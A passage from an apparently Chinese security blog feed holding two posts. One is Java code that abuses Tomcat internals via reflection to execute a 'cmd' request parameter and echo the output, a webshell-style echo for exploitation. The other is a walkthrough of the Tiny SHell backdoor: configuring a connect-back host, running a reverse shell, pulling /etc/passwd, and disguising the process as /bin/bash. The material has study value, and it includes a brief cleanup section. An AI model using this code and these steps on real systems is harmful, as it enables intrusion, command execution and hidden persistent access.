&#123;</span><br><span class="line">        input = <span class="string">"Echo Page"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取ApplicationDispatcher类的声明字段WRAP_SAME_OBJECT</span></span><br><span class="line">    Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Field类的声明字段modifiers</span></span><br><span class="line">    Field modifiersField = Field.class.getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加访问权限才能访问私有属性</span></span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除代表final的那个bit</span></span><br><span class="line">    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp;~ Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前WRAP_SAME_OBJECT_FIELD的值</span></span><br><span class="line">    <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果WRAP_SAME_OBJECT_FIELD值为false，说明是第一次调用、还未进行反射修改</span></span><br><span class="line">    <span class="keyword">if</span> (!WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]通过反射机制来修改WRAP_SAME_OBJECT的值为true"</span>);</span><br><span class="line">        <span class="comment">// 修改WRAP_SAME_OBJECT为true，才能反射修改到lastServicedRequest和lastServicedResponse</span></span><br><span class="line">        WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]WRAP_SAME_OBJECT的值已为true"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接跑之后控制台报如下错：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/7.png" alt=""></p><p>原因在于执行完Servlet的service()函数修改了WRAP_SAME_OBJECT为true后会进入下面的finally逻辑，其中会设置lastServicedRequest和lastServicedResponse两个变量值为null，但是这两个变量在默认情况下是null、并没有被新建：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/8.png" alt=""></p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/9.png" alt=""></p><p>根据这个错误信息，我们需要在代码中也新建lastServicedRequest和lastServicedResponse这两个实例，这样代码就没问题了。同时，还得加入获取URL参数并执行的代码，最后添加到Response中回显输出。看代码注释即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(String input, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(httpServletResponse);</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        input = <span class="string">"Echo Page"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取ApplicationDispatcher类的WRAP_SAME_OBJECT声明字段</span></span><br><span class="line">    <span class="comment">// 和ApplicationFilterChain类的lastServicedRequest与lastServicedResponse声明字段</span></span><br><span class="line">    Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Field类的modifiers声明字段</span></span><br><span class="line">    Field modifiersField = Field.class.getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加访问权限才能访问私有属性</span></span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除代表final的那个bit，才能成功修改static final</span></span><br><span class="line">    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp;~ Modifier.FINAL);</span><br><span class="line">    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp;~ Modifier.FINAL);</span><br><span class="line">    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp;~ Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前WRAP_SAME_OBJECT_FIELD的值</span></span><br><span class="line">    <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试获取当前lastServicedRequest和lastServicedResponse的值</span></span><br><span class="line">    <span class="comment">// 如果不是第一次访问该接口则为非null</span></span><br><span class="line">    ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);</span><br><span class="line">    ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非null就可以直接获取URL参数cmd</span></span><br><span class="line">    String cmd = lastServicedRequest != <span class="keyword">null</span> ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>) : <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]获取到请求的cmd参数: "</span> + cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果WRAP_SAME_OBJECT_FIELD值为false，说明是第一次调用、还未进行反射修改</span></span><br><span class="line">    <span class="comment">// 也未新建lastServicedRequest与lastServicedResponse实例</span></span><br><span class="line">    <span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedRequest == <span class="keyword">null</span> || lastServicedResponse == <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]通过反射机制来修改WRAP_SAME_OBJECT的值为true"</span>);</span><br><span class="line">        <span class="comment">// 修改WRAP_SAME_OBJECT为true，才能反射修改到lastServicedRequest和lastServicedResponse</span></span><br><span class="line">        WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建lastServicedRequest和lastServicedResponse实例，避免默认null导致报错</span></span><br><span class="line">        lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">        lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 执行cmd命令并添加到Response中回显</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]WRAP_SAME_OBJECT的值已为true且存在cmd参数"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取保存到lastServicedResponse中的ServletResponse</span></span><br><span class="line">        ServletResponse servletResponse = lastServicedResponse.get();</span><br><span class="line">        PrintWriter printWriter = servletResponse.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取ResponseFacade类的response声明字段，通过其获取ServletResponse里的Response对象</span></span><br><span class="line">        Field responseField = ResponseFacade.class.getDeclaredField(<span class="string">"response"</span>);</span><br><span class="line">        responseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Response response = (Response) responseField.get(servletResponse);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改Response对象的usingWriter声明字段为false</span></span><br><span class="line">        <span class="comment">// 不加这段代码也能成功回显命令执行结果，但会报错显示当前Response已调用getWriter()</span></span><br><span class="line">        <span class="comment">// 这是因为后续会调用Response的getOutputStream()，该函数和getWriter()是互相排斥的</span></span><br><span class="line">        <span class="comment">// 但可通过反射修改usingWriter标志使得程序认为未调用getWriter()而跳过抛出异常的逻辑</span></span><br><span class="line">        Field usingWriterField = Response.class.getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">        usingWriterField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        usingWriterField.set(response, Boolean.FALSE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断当前OS类型</span></span><br><span class="line">        <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">        String osType = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">        <span class="keyword">if</span> (osType != <span class="keyword">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">            isLinux = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行命令并将结果写入ServletResponse的PrintWriter中</span></span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">        InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(inputStream).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">        String output = scanner.hasNext() ? scanner.next() : <span class="string">""</span>;</span><br><span class="line">        printWriter.write(output);</span><br><span class="line">        printWriter.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码所示，访问两次就出回显了：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/10.png" alt=""></p><h3 id="半通用的原因"><a href="#半通用的原因" class="headerlink" title="半通用的原因"></a>半通用的原因</h3><p>利用Tomcat ApplicationFilterChain类实现回显利用的方式之所以说是半通用，这是因为在Shiro中并不可行。原因在于，ApplicationFilterChain类中Request和Response的设置是在Shiro反序列化漏洞触发点之后。</p><p>这里看到在调用ApplicationFilterChain类的internalDoFilter()函数时，调用到了Shiro的ShiroFilter过滤器类、其中会调用到CookieRememberMeManager类的getRememberedSerializedIdentity()函数来获取cookie内容并进行反序列化操作，这个过程都是还在调用应用的doFilter()的时候就触发了，而间于Filter Chain执行之后、调用Servlet实例之前的Request和Response的设置就不起作用了：</p><p><img src="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/11.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/7348" target="_blank" rel="noopener">Tomcat中一种半通用回显方法</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://www.mi1k7ea.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>Unix后门Tiny SHell工具浅析</title>
    <link href="https://www.mi1k7ea.com/2021/09/27/Unix%E5%90%8E%E9%97%A8Tiny-SHell%E5%B7%A5%E5%85%B7%E6%B5%85%E6%9E%90/"/>
    <id>https://www.mi1k7ea.com/2021/09/27/Unix后门Tiny-SHell工具浅析/</id>
    <published>2021-09-27T02:06:08.000Z</published>
    <updated>2021-10-11T12:46:54.916Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TSH简介"><a href="#0x00-TSH简介" class="headerlink" title="0x00 TSH简介"></a>0x00 TSH简介</h2><p>Tiny SHell即TSH是Orange于8年前开发的一款开源的UNIX后门工具，由C编写，体积Tiny。</p><p>支持功能：</p><ul><li>正向/反向连接模式；</li><li>文件传输；</li><li>加密通信；</li></ul><p>地址：<a href="https://github.com/orangetw/tsh" target="_blank" rel="noopener">https://github.com/orangetw/tsh</a></p><h2 id="0x01-工具使用"><a href="#0x01-工具使用" class="headerlink" title="0x01 工具使用"></a>0x01 工具使用</h2><p>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/orangetw/tsh.git</span><br></pre></td></tr></table></figure><p>修改tsh.h文件，主要修改密钥和控制端地址（如果使用反向连接）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">"replace with your password"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 7586</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAKE_PROC_NAME <span class="meta-string">"/bin/bash"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">"localhost"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>secret：用于加密控制端和被控端之间通信的数据，这里所有通信都经过AES加密处理，密钥的长度任意（最好大于12，更安全）；</li><li>SERVER_PORT：服务端监听端口号；</li><li>FAKE_PROC_NAME：用于伪装显示后门运行后的进程名字（用<code>ps -ef</code>或者<code>netstat</code>查看显示的进程名字）；</li><li>CONNECT_BACK_HOST：控制端地址；</li><li>CONNECT_BACK_DELAY：连接延时，默认延时单位为秒；</li></ul><p>编译，参数从<code>linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf</code>中选择，我本地环境为linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br></pre></td></tr></table></figure><p>编译完成后，在当前目录中会生成tsh和tshd两个文件。</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>前提准备是在编译前将tsh.h文件中的CONNECT_BACK_HOST设置为反向连接的控制端地址后再进行编译操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_HOST  <span class="meta-string">"控制端地址"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_BACK_DELAY 30</span></span><br></pre></td></tr></table></figure><p>在控制端运行tsh程序开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tsh</span><br><span class="line">./tsh cb</span><br></pre></td></tr></table></figure><p>在被控制端运行tshd即可定时反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tshd</span><br><span class="line">./tshd</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/1.png" alt=""></p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在编译前注释掉tsh.h文件中关于反向连接的两个设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define CONNECT_BACK_HOST  "控制端地址"</span></span><br><span class="line"><span class="comment">//#define CONNECT_BACK_DELAY 30</span></span><br></pre></td></tr></table></figure><p>先在被控制端运行tshd：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tshd</span><br><span class="line">./tshd</span><br></pre></td></tr></table></figure><p>然后在控制端运行tsh程序发起正向连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x tsh</span><br><span class="line">./tsh 被控制端IP</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/3.png" alt=""></p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>正向连接下载文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控制端IP get /etc/passwd ./</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/10.png" alt=""></p><p>上传文件改为put即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh 被控制端IP put aaa.sh /tmp</span><br></pre></td></tr></table></figure><h3 id="简单隐蔽"><a href="#简单隐蔽" class="headerlink" title="简单隐蔽"></a>简单隐蔽</h3><p>前面的默认操作隐蔽性弱、容易被用户发现，比如不修改程序名直接运行的话通过lsof命令还是能看到原程序名的：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/4.png" alt=""></p><p>修改下名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv tshd bash</span><br></pre></td></tr></table></figure><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/5.png" alt=""></p><p>看到还是有个缺点，就是通过pwdx命令查看程序所在路径会有所暴露，因此可以进一步移动到可执行程序常在的目录中伪装，一般系统的bash位于<code>/bin/bash</code>或<code>/usr/bin/bash</code>，笔者的环境<code>/usr/bin</code>下没有bash就放到这里了，其他如<code>/usr/sbin</code>目录也可以：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/6.png" alt=""></p><p>但是遇到个问题，放到目录下无法正常正向连接。参考<a href="https://cloud.tencent.com/developer/article/1047029" target="_blank" rel="noopener">这篇文章</a>说的，在tsh.c中看到是执行<code>bash --login</code>命令的，但是该bash程序并没有指定执行的路径，依靠目标环境变量PATH的值设置的路径来逐个寻找：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/7.png" alt=""></p><p>而测试的目标主机PATH环境变量为<code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code>，即<code>/usr/bin</code>在正常bash目录<code>/bin</code>的前面，导致没有执行到正常的bash。因此修改下其中的bash为绝对路径的bash即可：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/8.png" alt=""></p><p>重新编译上传运行，就OK了：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/9.png" alt=""></p><p>看到<code>ps -ef</code>命令的结果，其中<code>-bash</code>是正常的bash进程，而12611和12613都是后门守护进程、其伪装成<code>/bin/bash</code>，12614为后门守护进程执行系统命令<code>exec /bin/bash --login</code>反弹的shell进程。</p><p>除此之外，连接的端口号也需要改为常用的端口以便于隐藏。</p><h2 id="0x02-后门清理"><a href="#0x02-后门清理" class="headerlink" title="0x02 后门清理"></a>0x02 后门清理</h2><p>以反连为例，查看异常bash连接端口、进程ID等，如果攻击者没有修改程序名且没有魔改直接编译使用的话，可以通过对比看<code>/proc/pid/comm</code>的真实进程名来查杀即可：</p><p><img src="/2021/09/27/Unix后门Tiny-SHell工具浅析/2.png" alt=""></p><p>正连类似的，用lsof命令也能直接分析出来。</p><p>至于修改程序名或魔改后的后门程序，可自行根据实际情况分析，这里没有细究。</p><h2 id="0x03-原理浅析"><a href="#0x03-原理浅析" class="headerlink" title="0x03 原理浅析"></a>0x03 原理浅析</h2><p>tsh代码简洁，这里仅看看它服务端即tshd的关键部分。</p><p>执行后门tshd后，先是重写cmdline为用户设置的伪装进程名（默认为<code>/bin/bash</code>），然后主进程会fork一个子进程1，父进程退出，该子进程1则成为孤儿进程被init托管：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* overwrite cmdline */</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span> *)argv[<span class="number">0</span>], <span class="string">'\0'</span>, <span class="built_in">strlen</span>(argv[<span class="number">0</span>]));</span><br><span class="line"><span class="built_in">strcpy</span>(argv[<span class="number">0</span>], FAKE_PROC_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fork into background */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">0</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后面的循环处理中，当子进程1成功连接上控制端监听的端口之后，会又fork一个子进程2用于处理建立好的连接，而该子进程2的父进程即子进程1会等待子进程2执行完再继续往下执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fork a child to handle the connection */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    close( client );</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    waitpid( pid, <span class="literal">NULL</span>, <span class="number">0</span> );</span><br><span class="line">    close( client );</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子进程2接着会fork一个子进程3，然后子进程2退出，从而使得子进程3脱离了其祖父进程即子进程1成为孤儿进程、被init托管、成为守护进程，子进程3中开始真正进行交互shell/文件传输操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the child forks and then exits so that the grand-child's</span></span><br><span class="line"><span class="comment"> * father becomes init (this to avoid becoming a zombie) */</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">8</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( pid != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>( <span class="number">9</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* setup the packet encryption layer */</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get the action requested by the client */</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">/* howdy */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>( message[<span class="number">0</span>] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> GET_FILE:</span><br><span class="line"></span><br><span class="line">        ret = tshd_get_file( client );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PUT_FILE:</span><br><span class="line"></span><br><span class="line">        ret = tshd_put_file( client );</span><br><span class="line">        <span 